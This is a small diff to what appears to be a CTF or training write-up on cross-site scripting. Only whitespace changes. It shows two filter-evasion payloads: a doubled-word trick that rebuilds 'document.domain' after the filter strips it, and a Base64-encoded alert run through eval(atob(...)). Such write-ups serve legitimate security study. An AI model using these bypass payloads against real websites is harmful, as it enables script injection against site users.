@@ -213,11 +213,11 @@ There are a few different approaches to solve this stage.
 
 1. The payload here is designed in such a way that the word 'domain' will be regenerated if broken down.
     
-        "><script>alert(document.dodomainmain)</script>
+       "><script>alert(document.dodomainmain)</script>
 
 2. Encode and decode 'document.domain' with Base64.
 
-        "><script>(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))</script>
+       "><script>(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))</script>
 
 4. Split the 'document.domain' part and concat it back.
 
